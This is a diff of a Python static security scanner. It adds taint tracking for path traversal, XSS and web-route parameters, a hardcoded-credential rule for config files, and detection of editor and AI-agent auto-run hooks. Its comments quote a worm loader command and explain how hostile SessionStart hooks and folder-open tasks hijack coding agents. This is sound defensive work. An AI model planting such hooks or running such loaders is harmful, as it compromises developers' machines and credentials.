+# indented, at most _GUARD_BLOCK_LINES of them).
+_GUARD_BLOCK_LINES = 12
+_GUARD_IF_RE = {"py": re.compile(r"^\s*(?:el)?if\b"),
+                "js": re.compile(r"^\s*(?:\}\s*)?(?:else\s+)?if\s*\(")}
+_DOTDOT = r"""(?:'\.\.[/\\]{0,2}'|"\.\.[/\\]{0,2}"|`\.\.[/\\]{0,2}`)"""
+_GUARD_VAR_RES = {
+    "py": (re.compile(_DOTDOT + r"\s+(?:not\s+)?in\s+([A-Za-z_]\w*)(?![\w.(\[])"),
+           re.compile(r"(?<![\w.])([A-Za-z_]\w*)\s*\.\s*(?:startswith|is_relative_to)\s*\(\s*(?![\s'\"])"),
+           re.compile(r"(?:realpath|abspath|normpath)\s*\(\s*([A-Za-z_]\w*)\s*\)\s*\.\s*startswith\s*\(\s*(?![\s'\"])")),
+    "js": (re.compile(r"(?<![\w$.])([A-Za-z_$][\w$]*)\s*\.\s*(?:includes|indexOf)\s*\(\s*" + _DOTDOT + r"\s*\)"),
+           re.compile(r"(?<![\w$.])([A-Za-z_$][\w$]*)\s*\.\s*startsWith\s*\(\s*(?![\s'\"`])")),
+}
+# os.path.commonpath([BASE, path]): every name in the list
+_GUARD_COMMONPATH_RE = re.compile(r"commonpath\s*\(\s*[\[(]([^\[\]()]{0,256})[\])]")
+_GUARD_NAME_RE = re.compile(r"^\s*([A-Za-z_]\w*)\s*$")
+_GUARD_EXIT_RE = {
+    "py": re.compile(r"\b(?:return|raise|continue|break)\b|(?<![\w.])(?:abort|flask\.abort|sys\.exit)\s*\("),
+    "js": re.compile(r"\b(?:return|throw|continue|break)\b|(?<![\w$.])process\.exit\s*\("),
+}
+# Allowlist guards: a value found in a collection of the code's own (`if name
+# in ALLOWED:`, `if (allowed.includes(name))`, `.has(name)`) is one of its
+# members inside the block — clean for every category there — and after a
+# branch that leaves when it is not (`if name not in ALLOWED: abort(404)`,
+# `if (!allowed.has(name)) return …`). Not when the collection is request
+# data or holds it (`if key in request.args`).
+_ALLOW_GUARD_RE = {
+    "py": re.compile(r"^\s*(?:el)?if\s+(?:\(\s*)?([A-Za-z_]\w*)\s+(not\s+)?in\s+([^:\n]+?)\s*\)?\s*:"),
+    "js": re.compile(r"^\s*(?:\}\s*)?(?:else\s+)?if\s*\(\s*(!\s*)?([\w$.]+|\[[^\[\]\n]*\])\s*\.\s*(?:includes|has)\s*\("
+                     r"\s*([A-Za-z_$][\w$]*)\s*\)\s*\)"),
+}
+
+
+def _allow_guard(stmt, lang):
+    """(name, collection text, negated) of an allowlist guard in `stmt`
+    (see above), or None."""
+    m = _ALLOW_GUARD_RE[lang].match(stmt)
+    if not m:
+        return None
+    if lang == "py":
+        return m.group(1), m.group(3), bool(m.group(2))
+    return m.group(3), m.group(2), bool(m.group(1))
+
+
+def _guarded_names(stmt, lang):
+    """Names a path-traversal guard condition in `stmt` checks (see above)."""
+    names = [m.group(1) for r in _GUARD_VAR_RES[lang] for m in r.finditer(stmt)]
+    if lang == "py" and "commonpath" in stmt:
+        for m in _GUARD_COMMONPATH_RE.finditer(stmt):
+            names.extend(n.group(1) for n in map(_GUARD_NAME_RE.match, m.group(1).split(",")) if n)
+    return names
+
+
+def _guard_exits(ctx, i, stmt, lang):
+    """True when the `if` on line i (joined statement `stmt`) leaves: an
+    exit on its own line or at the start of a line of its block."""
+    exit_re = _GUARD_EXIT_RE[lang]
+    if exit_re.search(stmt):
+        return True
+    line = ctx.mcode(i)
+    indent = len(line) - len(line.lstrip())
+    seen, j = 0, i + 1
+    while j < len(ctx.lines) and seen < _GUARD_BLOCK_LINES:
+        if not ctx.cmask[j]:
+            code = ctx.mcode(j)
+            body = code.lstrip()
+            if body:
+                if len(code) - len(body) <= indent:
+                    return False
+                if exit_re.match(body):
+                    return True
+                seen += 1
+        j += 1
+    return False
+
+
+# Flask (or Quart) views: what one returns is the response body, HTML by
+# default. A function decorated with @….route(…) — or @….get / post / put /
+# patch / delete(…) in a file that imports flask or quart — is a view; its own
+# `return` lines (not those of a function nested in it) are XSS sinks unless
+# the value (a returned tuple's first item) is a JSON container, a redirect, a
+# template, a file or a response object: those are read as what they are. A
+# FastAPI path operation returns JSON unless its decorator sets
+# `response_class=HTMLResponse`: then it is a view too.
+_FLASK_IMPORT_RE = re.compile(r"^\s*(?:from\s+(?:flask|quart)\b|import\s+(?:flask|quart)\b)")
+_FASTAPI_IMPORT_RE = re.compile(r"^\s*(?:from\s+fastapi\b|import\s+fastapi\b)")
+_DJANGO_IMPORT_RE = re.compile(r"^\s*(?:from\s+django\b|import\s+django\b)")
+_VIEW_DECORATOR_RE = re.compile(r"^\s*@[\w.]+\.(route|get|post|put|patch|delete|api_route)\s*\(")
+_HTML_RESPONSE_CLASS_RE = re.compile(r"\bresponse_class\s*=\s*(?:[\w.]*\.)?HTMLResponse\b")
+_DEF_RE = re.compile(r"^\s*(?:async\s+def|def|class)\b")
+_RETURN_RE = re.compile(r"^\s*return\b")
+_VIEW_RETURN_SKIP_RE = re.compile(
+    r"\s*(?:\{|\[|dict\s*\(|(?:[A-Za-z_][\w.]*\.)?(?:redirect|jsonify|url_for|send_file|send_from_directory"
+    r"|send_static_file|abort|render_template)\s*\()")
+
+
+# A view that returns what a function call gives (`return User.to_dict(q)`,
+# `return request.get_json()`) returns that function's value, most often a
+# dict or a response: only the string builders' results are read as the body
+# (`return str(x)`, `return "…".format(x)`, `return ", ".join(xs)`).
+_VIEW_CALL_RE = re.compile(r"\s*([A-Za-z_][\w.]*)\s*\(")
+_STRING_BUILDERS = frozenset((
+    "str", "format", "join", "replace", "strip", "lstrip", "rstrip", "upper", "lower", "title",
+    "capitalize", "casefold", "swapcase", "decode", "zfill", "ljust", "rjust", "center", "expandtabs",
+    "dumps"))
+
+
+def _view_body(value):
+    """False when a view's return value `value` is a call of a function that
+    is not a string builder (see above)."""
+    m = _VIEW_CALL_RE.match(value)
+    if not m or m.group(1).rsplit(".", 1)[-1] in _STRING_BUILDERS:
+        return True
+    end = _call_close(value, m.end())
+    return end >= len(value) or bool(value[end + 1:].strip())
+
+
+def _view_returns(ctx):
+    """Indices of the `return` lines of the file's Flask views and HTML
+    FastAPI path operations (see above)."""
+    code = [("" if ctx.cmask[i] else ctx.mcode(i)) for i in range(len(ctx.lines))]
+    flask = any(_FLASK_IMPORT_RE.match(c) for c in code)
+    fastapi = not flask and any(_FASTAPI_IMPORT_RE.match(c) for c in code)
+    out = set()
+    stack = []              # [indent, is_view] of the enclosing defs
+    pending = False         # a view decorator seen, its def not yet
+    operation = False       # the decorator being read is a FastAPI path operation's
+    open_brackets = 0       # a decorator's arguments still open …
+    continued = 0           # … over this many lines (at most TAINT_JOIN_MAX_LINES)
+    for i, c in enumerate(code):
+        body = c.lstrip()
+        if not body:
+            continue
+        if open_brackets > 0 and continued < TAINT_JOIN_MAX_LINES:
+            open_brackets += _bracket_depth(c)
+            continued += 1
+            if operation and _HTML_RESPONSE_CLASS_RE.search(c):
+                pending = True
+            continue
+        open_brackets = 0
+        operation = False
+        indent = len(c) - len(body)
+        while stack and indent <= stack[-1][0]:
+            stack.pop()
+        if body.startswith("@"):
+            d = _VIEW_DECORATOR_RE.match(c)
+            if d and (d.group(1) == "route" or flask):
+                pending = True
+            elif d and fastapi:
+                operation = True
+                if _HTML_RESPONSE_CLASS_RE.search(c):
+                    pending = True
+            open_brackets, continued = _bracket_depth(c), 0
+            continue
+        if _DEF_RE.match(c):
+            stack.append([indent, pending and not body.startswith("class")])
+            pending = False
+            continue
+        pending = False
+        if stack and stack[-1][1] and _RETURN_RE.match(c):
+            out.add(i)
+    return out
+
+
+# Route handlers (0.1.7): the parameters a web framework fills from the
+# request are sources in the handler's body. Which ones is decided by
+# lazaret.scanner.frameworks (shared with the interprocedural engine): a
+# Flask view's URL rule variables, a FastAPI path operation's parameters but
+# what it injects or validates to no free text, a Django view's parameters
+# after `request` but the conventional int and slug names. Here they are
+# read from the lines: a function decorated with @….route(RULE) — or
+# @….get / post / put / patch / delete(RULE) in a file that imports flask or
+# quart — is a Flask view; one decorated with @….get / post / put / patch /
+# delete / options / head / api_route / websocket(…) in a file that imports
+# fastapi a FastAPI path operation; in a file that imports django, a
+# function whose first parameter is `request` (a method: `self, request`) a
+# Django view. A decorator or signature is read over the lines that
+# continue its brackets (at most TAINT_JOIN_MAX_LINES of them).
+_ROUTE_DECORATOR_RE = re.compile(
+    r"^\s*@[\w.]+\.(route|get|post|put|patch|delete|options|head|api_route|websocket)\s*\(")
+_ROUTE_RULE_RE = re.compile(r"""\(\s*[rRuU]?(["'])(.*?)\1""")
+_DEF_HEAD_RE = re.compile(r"^\s*(?:async\s+)?def\s+\w+\s*\(")
+_PARAM_RE = re.compile(r"\s*\*{0,2}\s*([A-Za-z_]\w*)\s*")
+_top_split = frameworks.top_split
+_safe_type = frameworks.safe_type
+
+
+def _signature_params(sig):
+    """[(name, annotation, default)] of the parameters of the def whose text
+    (with the lines that continue it) is `sig`."""
+    m = _DEF_HEAD_RE.match(sig)
+    if not m:
+        return []
+    out = []
+    for part in _top_split(sig[m.end():_call_close(sig, m.end())], ","):
+        pm = _PARAM_RE.match(part)
+        if not pm or pm.end() < len(part) and part[pm.end()] not in ":=":
+            continue
+        ann, default = "", ""
+        rest = part[pm.end():]
+        if rest.startswith(":"):
+            pieces = _top_split(rest[1:], "=")
+            ann, default = pieces[0], "=".join(pieces[1:])
+        elif rest.startswith("="):
+            default = rest[1:]
+        out.append((pm.group(1), ann.strip(), default.strip()))
+    return out
+
+
+def _fastapi_params(params, aliases=frozenset()):
+    """The names of `params` a FastAPI path operation fills from the
+    request; `aliases`: the file's dependency aliases."""
+    return [name for name, ann, default in params if frameworks.fastapi_param(name, ann, default, aliases)]
+
+
+def _flask_params(rule, params):
+    """The names of `params` the Flask URL rule `rule` fills with free text."""
+    free = frameworks.flask_free_vars(rule)
+    return [name for name, _ann, _default in params if name in free]
+
+
+def _django_params(params):
+    """The names of `params` a Django URL pattern fills with free text, when
+    `params` are a view's (see above)."""
+    names = [name for name, _ann, _default in params]
+    first = 2 if names[:2] == ["self", "request"] else 1 if names[:1] == ["request"] else 0
+    if not first:
+        return []
+    return [name for name, ann, _default in params[first:] if frameworks.django_param(name, ann)]
+
+
+def _route_params(ctx):
+    """{index of a route handler's def line: [names of the parameters the
+    framework fills from the request]} (see above)."""
+    code = [("" if ctx.cmask[i] else ctx.mcode(i)) for i in range(len(ctx.lines))]
+    flask = any(_FLASK_IMPORT_RE.match(c) for c in code)
+    fastapi = not flask and any(_FASTAPI_IMPORT_RE.match(c) for c in code)
+    django = any(_DJANGO_IMPORT_RE.match(c) for c in code)
+    aliases = frameworks.dep_aliases("\n".join(code)) if fastapi else frozenset()
+
+    def joined(i):
+        """(line i's code with the lines that continue its brackets, the
+        index of the last of them)."""
+        parts, depth, j = [code[i]], _bracket_depth(code[i]), i
+        while depth > 0 and j + 1 < len(code) and j + 1 <= i + TAINT_JOIN_MAX_LINES:
+            j += 1
+            parts.append(code[j])
+            depth += _bracket_depth(code[j])
+        return " ".join(parts), j
+
+    out = {}
+    routes = []             # (framework, rule) of the route decorators above the next def
+    i = 0
+    while i < len(code):
+        c = code[i]
+        body = c.lstrip()
+        if not body:
+            i += 1
+            continue
+        if body.startswith("@"):
+            text, last = joined(i)
+            d = _ROUTE_DECORATOR_RE.match(text)
+            if d and (d.group(1) == "route" or (flask and d.group(1) in frameworks.FLASK_ROUTE_METHODS)):
+                rule = _ROUTE_RULE_RE.search(text, d.end() - 1)
+                routes.append(("flask", rule.group(2) if rule else ""))
+            elif d and fastapi:
+                routes.append(("fastapi", ""))
+            i = last + 1
+            continue
+        if _DEF_HEAD_RE.match(c):
+            text, last = joined(i)
+            params = _signature_params(text)
+            names = []
+            for framework, rule in routes:
+                names.extend(_fastapi_params(params, aliases) if framework == "fastapi" else _flask_params(rule, params))
+            if not routes and django:
+                names = _django_params(params)
+            if names:
+                out[i] = list(dict.fromkeys(names))
+            routes = []
+            i = last + 1
+            continue
+        routes = []
+        i += 1
+    return out
+
+
+# Where a taint lives, read from the file's indentation: a name tainted in a
+# function's body (a def or class in Python; in JavaScript a function, method
+# or arrow function whose body is a block) is dropped when that body ends, so
+# another function's variable of the same name is not taken for it. A
+# reassignment that runs whenever the tainting one did — later in the same
+# block, or in a block that encloses it — replaces the value (`path =
+# secure_filename(path)` is clean for path traversal; `name = "fixed"` is
+# clean); one in a nested or sibling block (an if, an else, a case) adds to
+# it: the name stays tainted, and clean only for what both values are clean
+# for. The lines of a multi-line string are not part of the structure, nor
+# in Python the lines that continue a statement's brackets (at most
+# TAINT_JOIN_MAX_LINES of them); JavaScript's braces open blocks, and its
+# lines are read by their indentation alone.
+_JS_FUNCTION_WORD_RE = re.compile(r"\bfunction\b")
+_JS_METHOD_HEAD_RE = re.compile(
+    r"^\s*(?:(?:async|static|get|set)\s+){0,3}(?!(?:if|for|while|switch|catch|with|function|return)\b)"
+    r"[A-Za-z_$][\w$]*\s*\([^()]*\)$")
+
+
+def _scope_opener(code, lang):
+    """True when line `code` opens a function body (see above)."""
+    if lang == "py":
+        return bool(_DEF_RE.match(code))
+    t = code.rstrip()
+    if not t.endswith("{"):
+        return False
+    head = t[:-1].rstrip()
+    if head.endswith("=>"):
+        return True
+    if not head.endswith(")"):
+        return False
+    return bool(_JS_FUNCTION_WORD_RE.search(head) or _JS_METHOD_HEAD_RE.match(head))
+
+
+def _literal_continuations(ctx):
+    """Indices of the lines whose first non-blank character lies inside a
+    string literal that began on an earlier line."""
+    lits = ctx._literals
+    out = set()
+    if not lits:
+        return out
+    starts = _line_starts(ctx.content)
+    k, reach = 0, -1
+    for j, line in enumerate(ctx.lines):
+        p = starts[j] + len(line) - len(line.lstrip())
+        while k < len(lits) and lits[k][0] < p:
+            reach = max(reach, lits[k][1])
+            k += 1
+        if p < reach:
+            out.add(j)
+    return out
+
+
 def taint_scan(path, lines, lang, ctx=None):
     if lang not in TAINT_SOURCES:   # SQL and others: pattern rules only, no taint flow
         return []
@@ -1123,10 +1889,28 @@ def taint_scan(path, lines, lang, ctx=None):
     # (Match text: NFKC for Python, decoded identifier escapes for JS.)
     cmask = ctx.cmask
     issues = []
-    tainted = {}   # var -> (line_no, frozenset(clean sink suffixes), taint order)
+    # var -> [line_no, frozenset(clean sink suffixes), taint order, scope id,
+    #         ((indent, block id), …) of the blocks it was tainted in]
+    tainted = {}
     src = TAINT_SOURCES[lang]
-    partial_cats = list(_PARTIAL_SAN.get(lang, {}))
+    sinks = TAINT_SINKS[lang]
+    partial = _PARTIAL_SAN.get(lang, {})
+    if lang == "py" and not _TEMPLATE_IMPORT_RE.search(ctx.content):
+        sinks = [row for row in sinks if row[1] is not _TEMPLATE_SINK_RE]
+    suffixes = list(dict.fromkeys(row[0] for row in sinks))
     ident_re = _IDENT_RUN_RE[lang]
+    views = _view_returns(ctx) if lang == "py" and "@" in ctx.content else ()
+    routes = _route_params(ctx) if lang == "py" and "def" in ctx.content else {}
+    pending = None          # (scope id, names, def line) of a route handler whose body is not yet seen
+    xss_sink = next((row for row in sinks if row[0] == "XSS"), None)
+    guard_if = _GUARD_IF_RE[lang]
+    inside = _literal_continuations(ctx)
+    levels = []             # open blocks: [indent, block id, scope id or None]
+    ids = [0, 0, 0]         # next block id, scope id, taint order
+    in_scope = collections.defaultdict(list)    # scope id -> names tainted in it
+    opener = None           # (indent, scope id) of a function whose body is not yet seen
+    open_depth = 0          # brackets a statement leaves open …
+    continued = 0           # … over this many continuation lines
 
     def carriers_in(text_code, suf):
         """Tainted vars present in text_code that still pose danger for sink
@@ -1138,6 +1922,63 @@ def taint_scan(path, lines, lang, ctx=None):
         found.sort(key=lambda v: tainted[v][2])
         return found
 
+    def statement(i, line):
+        """Line i's code, joined with the lines that continue its open brackets."""
+        depth = _bracket_depth(line)
+        if depth <= 0:
+            return line
+        parts, total, j = [line], 0, i + 1
+        while depth > 0 and j < len(lines) and j <= i + TAINT_JOIN_MAX_LINES \
+                and total < TAINT_JOIN_MAX_CHARS:
+            if not cmask[j]:
+                nxt = ctx.mcode(j)[:TAINT_JOIN_MAX_CHARS - total]
+                parts.append(nxt)
+                total += len(nxt)
+                depth += _bracket_depth(nxt)
+            j += 1
+        return " ".join(parts)
+
+    keyed = {}              # container -> {literal key: clean set, None: no untrusted data}
+    allowed = []            # [indent, name, taint order, clean set before] of the allowlist guards open
+
+    def value_clean(rhs):
+        """None when the value `rhs` carries no untrusted data, else the
+        sink suffixes it is clean for: a sanitizer for the category, or
+        every carrier already clean for it."""
+        rhs = _keyed_reads(rhs, keyed)
+        base = _taint_code(_neutralize(rhs, lang), lang)   # full sanitizers stripped
+        if not (src.search(base) or carriers_in(base, None)):
+            return None
+        clean = set()
+        for suf in suffixes:
+            neut = _taint_code(_neutralize(rhs, lang, suf), lang) if suf in partial else base
+            if not src.search(neut) and not carriers_in(neut, suf):
+                clean.add(suf)
+        # a response object (make_response(…), HttpResponse(…)) or a value
+        # marked safe: the XSS sink reports what it is built from
+        if xss_sink is not None and xss_sink[1].search(rhs):
+            clean.add("XSS")
+        # a path on this site, or a URL on a fixed host
+        if _SAME_SITE_RE.match(rhs):
+            clean.add("REDIR")
+        return frozenset(clean)
+
+    def report(suffix, cat, sev, cwe, fix, text, i, col):
+        """A T-* finding when `text` (a sink's arguments, a view's return
+        value) carries untrusted data for sink category `suffix`."""
+        rest_code = _taint_code(_neutralize(_keyed_reads(text, keyed), lang, suffix), lang)
+        carriers = carriers_in(rest_code, suffix)
+        if not carriers and not src.search(rest_code):
+            return
+        what = (f"untrusted data via '{carriers[0]}' (tainted at line {tainted[carriers[0]][0]})"
+                if carriers else "untrusted data")
+        issues.append(mk_issue(
+            {"id": f"T-{suffix}", "name": f"Tainted flow → {cat}", "type": "VULN", "sev": sev,
+             "msg": f"Possible {cat}: {what} reaches this sink.",
+             "why": "Data from user input or a decode function flows into a dangerous call "
+                    "without visible sanitization (lightweight intra-file taint tracking).",
+             "fix": fix, "ref": f"{cwe} · Taint analysis"}, path, i + 1, lines, col))
+
     for i in range(len(lines)):
         if cmask[i]:
             continue
@@ -1146,37 +1987,132 @@ def taint_scan(path, lines, lang, ctx=None):
             continue
         if not i & 63:
             ctx.check_time()
+        # ---- the structure (see "Where a taint lives") ----
+        structural = False
+        if i not in inside:
+            depth = sum(_BRACKET_DELTA.get(ch, 0) for ch in ctx.names_code(i)) if lang == "py" else 0
+            if open_depth > 0 and continued < TAINT_JOIN_MAX_LINES:
+                open_depth = max(0, open_depth + depth)
+                continued += 1
+            else:
+                structural = True
+                open_depth, continued = max(0, depth), 0
+                raw = lines[i]
+                indent = len(raw) - len(raw.lstrip())
+                while allowed and indent <= allowed[-1][0]:        # an allowlist guard's block ends
+                    _, n, order, before = allowed.pop()
+                    if n in tainted and tainted[n][2] == order:
+                        tainted[n][1] = before
+                while levels and levels[-1][0] > indent:
+                    gone = levels.pop()[2]
+                    if gone is not None:         # a function's body ends
+                        for n in in_scope.pop(gone, ()):
+                            if n in tainted and tainted[n][3] == gone:
+                                del tainted[n]
+                if not levels or levels[-1][0] < indent:
+                    scope = opener[1] if opener is not None and indent > opener[0] else None
+                    levels.append([indent, ids[0], scope])
+                    ids[0] += 1
+                    if pending is not None and scope == pending[0]:
+                        # a route handler's body: the parameters it takes from the request
+                        chain = tuple((lv[0], lv[1]) for lv in levels)
+                        for name in pending[1]:
+                            keyed.pop(name, None)
+                            tainted[name] = [pending[2] + 1, frozenset(), ids[2], scope, chain]
+                            ids[2] += 1
+                            in_scope[scope].append(name)
+                        pending = None
+                opener = None
+                if _scope_opener(line, lang):
+                    opener = (indent, ids[1])
+                    pending = (ids[1], routes[i], i) if i in routes else None
+                    ids[1] += 1
+        stmt = None
         names, rhs = _assignment(line, lang)
+        container, written = (None, None) if names else _container_write(line, lang)
         if names:
-            base = STRING_LIT_RE.sub("", _neutralize(rhs, lang))  # full sanitizers stripped
-            is_tainted = bool(src.search(base)) or bool(carriers_in(base, None))
-            if is_tainted:
-                clean = set()
-                for suf in partial_cats:
-                    neut = STRING_LIT_RE.sub("", _neutralize(rhs, lang, suf))
-                    if not src.search(neut) and not carriers_in(neut, suf):
-                        clean.add(suf)
-                for name in names:
-                    if name not in tainted:
-                        tainted[name] = (i + 1, frozenset(clean), len(tainted))
-        for suffix, sink_re, cat, sev, cwe, fix in TAINT_SINKS[lang]:
+            stmt = statement(i, line)
+            joined = _assignment(stmt, lang)
+            if joined[0]:
+                names, rhs = joined
+            clean = value_clean(rhs)
+            chain = tuple((lv[0], lv[1]) for lv in levels)
+            scope = next((lv[2] for lv in reversed(levels) if lv[2] is not None), None)
+            augmented = bool(_AUG_ASSIGN_RE[lang].match(stmt))
+            for name in names:
+                if not augmented:
+                    keyed.pop(name, None)
+                old = tainted.get(name)
+                replaces = (old is not None and structural and not augmented
+                            and (levels[-1][0], levels[-1][1]) in old[4])
+                if old is None or replaces:
+                    if clean is None:
+                        tainted.pop(name, None)
+                    else:
+                        tainted[name] = [i + 1, clean, ids[2], scope, chain]
+                        ids[2] += 1
+                        if scope is not None:
+                            in_scope[scope].append(name)
+                elif clean is not None:
+                    old[1] = old[1] & clean
+        elif container is not None:
+            stmt = statement(i, line)
+            joined = _container_write(stmt, lang)
+            if joined[0] == container:
+                written = joined[1]
+            clean = value_clean(written)
+            km = _KEYED_WRITE_RE.match(stmt)
+            if km and km.group(1) == container:
+                keyed.setdefault(container, {})[km.group(3)] = clean
+            if clean is not None:
+                old = tainted.get(container)
+                if old is not None:
+                    old[1] = old[1] & clean
+                else:
+                    scope = next((lv[2] for lv in reversed(levels) if lv[2] is not None), None)
+                    tainted[container] = [i + 1, clean, ids[2], scope, tuple((lv[0], lv[1]) for lv in levels)]
+                    ids[2] += 1
+                    if scope is not None:
+                        in_scope[scope].append(container)
+        elif tainted and guard_if.match(line):
+            stmt = statement(i, line)
+            guarded = [n for n in _guarded_names(stmt, lang) if n in tainted]
+            if guarded and _guard_exits(ctx, i, stmt, lang):
+                for n in guarded:
+                    tainted[n][1] = tainted[n][1] | {"PATH"}
+            guard = _allow_guard(stmt, lang)
+            if guard is not None and guard[0] in tainted:
+                code = _taint_code(guard[1], lang)
+                if not src.search(code) and not carriers_in(code, None):
+                    entry = tainted[guard[0]]
+                    if guard[2]:                 # leaves when not a member: clean from here on
+                        if _guard_exits(ctx, i, stmt, lang):
+                            entry[1] = frozenset(suffixes)
+                    else:                        # a member inside the block
+                        raw = lines[i]
+                        allowed.append([len(raw) - len(raw.lstrip()), guard[0], entry[2], entry[1]])
+                        entry[1] = frozenset(suffixes)
+        xss_here = False
+        for suffix, sink_re, cat, sev, cwe, fix in sinks:
             sm = sink_re.search(line)
             if not sm:
                 continue
+            if stmt is None:
+                stmt = statement(i, line)
+            xss_here = xss_here or suffix == "XSS"
+            if suffix == "XSS" and (_NON_HTML_TYPE_RE.search(_extent(stmt[sm.end():])) if lang == "py"
+                                    else _NON_HTML_CHAIN_RE.search(sm.group(0))):
+                continue                      # a text/plain or JSON response
             # neutralize full + this-category sanitizers in the sink's arguments
-            rest = _neutralize(line[sm.end():], lang, suffix)
-            rest_code = STRING_LIT_RE.sub("", rest)
-            carriers = carriers_in(rest_code, suffix)
-            if not carriers and not src.search(rest_code):
-                continue
-            what = (f"untrusted data via '{carriers[0]}' (tainted at line {tainted[carriers[0]][0]})"
-                    if carriers else "untrusted data")
-            issues.append(mk_issue(
-                {"id": f"T-{suffix}", "name": f"Tainted flow → {cat}", "type": "VULN", "sev": sev,
-                 "msg": f"Possible {cat}: {what} reaches this sink.",
-                 "why": "Data from user input or a decode function flows into a dangerous call "
-                        "without visible sanitization (lightweight intra-file taint tracking).",
-                 "fix": fix, "ref": f"{cwe} · Taint analysis"}, path, i + 1, lines, sm.start()))
+            args = _sink_args(stmt[sm.end():], sink_re, lang, suffix)
+            report(suffix, cat, sev, cwe, fix, args, i, sm.start())
+        if i in views and not xss_here and xss_sink is not None:
+            if stmt is None:
+                stmt = statement(i, line)
+            rm = _RETURN_RE.match(stmt)
+            value = _first_arg(stmt[rm.end():])
+            if value.strip() and not _VIEW_RETURN_SKIP_RE.match(value) and _view_body(value):
+                report(xss_sink[0], *xss_sink[2:], value, i, rm.end() - 6)
     return issues
 
 # ---------------- Obfuscation / entropy heuristics ----------------
@@ -1417,8 +2353,10 @@ def byte_entropy(data):
 
 # Characters that cannot occur in text: bytes of invalid UTF-8 sequences
 # (decoded with surrogateescape to U+DC80..U+DCFF) and C0 controls other than
-# whitespace and ESC, NUL included.
-_NON_TEXT_CHARS_RE = re.compile("[\udc80-\udcff\x00-\x08\x0e-\x1a\x1c-\x1f\x7f]")
+# whitespace and ESC, NUL included. 0x0E..0x1A are listed one by one: the
+# class is the same, and reads as meant rather than as a wide range.
+_NON_TEXT_CHARS_RE = re.compile("[\udc80-\udcff\x00-\x08\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a"
+                                "\x1c-\x1f\x7f]")
 _NON_TEXT_SHARE = 0.30
 
 
@@ -1819,6 +2757,8 @@ def _lex_comment_spans(content, lang, strings=None, jsx=True, literals=None):
     are appended to it; if `literals` is, the spans of every literal both
     readings agree on: strings of any kind (f-strings, templates) and regex
     literals. jsx=False: a .ts file (no JSX reading)."""
+    if lang == "cfg":                       # a config or data file (configsecrets)
+        return configsecrets.comment_spans(content)
     lang = lang if lang in ("py", "js", "sql") else None
     if lang is None or (lang == "js" and not jsx):
         return _lex_pass(content, lang, strings, literals=literals)
@@ -2552,6 +3492,25 @@ class _FileCtx(_Redactor):
     def check_time(self):
         if self.deadline is not None and time.monotonic() > self.deadline:
             raise _ScanBudgetExceeded()
+
+
+class _ConfigCtx(_FileCtx):
+    """A config file's context (scan_config_file): a line any snippet shows
+    also has the value of every credential-named key redacted — a .env's
+    `DB_PASS=hunter2` matches none of the code patterns."""
+
+    def redacted(self, k):
+        r = self._red.get(k)
+        if r is None:
+            if self._pem is None:
+                self._pem = _pem_block_lines(self.lines)
+            if k in self._pem:
+                r = REDACTED
+            else:
+                r = self.secrets().redact(
+                    _redact_context_line(configsecrets.redact_values(self.lines[k])))
+            self._red[k] = r
+        return r
 
 
 def _active_ctx(lines):
@@ -3605,6 +4564,233 @@ def scan_file(path, content, lang, dep=False):
         _TLS.ctx = outer
 
 
+# ---------------- Config and data files (credentials only) ----------------
+# .env, JSON, YAML, TOML, INI, .properties, shell, PEM keys, Dockerfiles,
+# .npmrc / .pypirc, Terraform variables (configsecrets.is_config_file): read
+# as text and checked by the two credential rules, never as code.
+_TOKEN_RULE = next(r for r in RULES if r["id"] == "S-TOKEN")
+CONFIG_SECRET_RULE = {
+    "id": "S-SECRET", "name": "Hardcoded credential", "type": "VULN", "sev": "BLOCKER",
+    "msg": "Credential appears to be hardcoded in a config file.",
+    "why": ("Config files are committed, copied into images and shared: a credential in one "
+            "leaks with every copy, and rotating it means finding them all."),
+    "fix": "Reference it instead (${VAR}, a secrets manager), and rotate this one now.",
+    "ref": "CWE-798 · OWASP A07"}
+
+
+def _config_token_col(line, lines, i):
+    """Column of the first S-TOKEN match on a config line that is reported: not
+    a documentation sample, and a private-key header only with key material
+    after it, on the line or the next two (configsecrets.key_material)."""
+    for m in _TOKEN_RULE["re"].finditer(line):
+        text = m.group(0)
+        if configsecrets.documentation_token(text):
+            continue
+        if text.startswith("-----BEGIN") and not any(
+                configsecrets.key_material(t) for t in [line[m.end():]] + lines[i + 1:i + 3]):
+            continue
+        return m.start()
+    return None
+
+
+# ---------------- Settings that run commands (SC-AUTORUN) ----------------
+# An editor's or an AI agent's settings in the tree that make it run a
+# command on its own (autorun: a VS Code folder-open task, a Claude Code,
+# Cursor or Gemini CLI hook, an MCP server): INFO inventory — they run with
+# the user's privileges whenever the folder is opened or the agent works in
+# it — and CRITICAL when the command, or a file of the tree it runs (read
+# like an install hook's: follow_hook, install_script_risk), looks hostile,
+# or that file is obfuscated. Mini Shai-Hulud and the keyv wave committed a
+# SessionStart hook and a folder-open task running the worm's loader
+# (`node .claude/setup.mjs`, which fetches Bun to run the payload) to every
+# repository they reached. A file that cannot be read as JSON but names what
+# its tool runs is MAJOR: the tool may read it more leniently.
+AUTORUN_SHOW = 200                 # code points of a command a message shows
+_AUTORUN_WHY = (
+    "Editors and AI coding agents run these commands on their own — when the folder is opened, a "
+    "session starts or the agent uses a tool — with your privileges, without asking each time. The "
+    "2026 Shai-Hulud worms (Mini Shai-Hulud, the keyv wave) committed a Claude Code SessionStart hook "
+    "and a VS Code folder-open task to every repository they reached, so opening a checkout ran the "
+    "worm.")
+
+
+def _autorun_rule(sev, msg, why, fix):
+    return {"id": "SC-AUTORUN", "name": "Settings run a command automatically", "type": "HOTSPOT",
+            "sev": sev, "msg": msg, "why": why, "fix": fix, "ref": "CWE-506 · Supply chain"}
+
+
+_AGENT_SETTINGS_REASON = "writes an AI agent's or editor's auto-run settings"
+
+
+def _autorun_script_risk(text):
+    """install_script_risk for what a settings file runs, but for writing an
+    agent's or editor's settings: an agent's own hooks manage them (a
+    WorktreeCreate hook copies settings.local.json into the new worktree)."""
+    return [r for r in install_script_risk(text) if not r.startswith(_AGENT_SETTINGS_REASON)]
+
+
+def _autorun_risk(command, base, read):
+    """-> (reasons, target): why a command a settings file runs looks hostile,
+    and the file of the tree it runs that does (None when it is the command
+    itself); ([], None) when nothing does."""
+    reasons = []
+    hijack = agent_hijack_in_command(command)
+    if hijack is not None:
+        reasons.append(f'starts the AI agent "{hijack[0]}" with {hijack[1]}')
+    reasons.extend(_autorun_script_risk(command))
+    if reasons or read is None:
+        return reasons, None
+    for target in follow_hook(autorun.local_command(command))[0]:
+        rel = _tree_join(base, target)
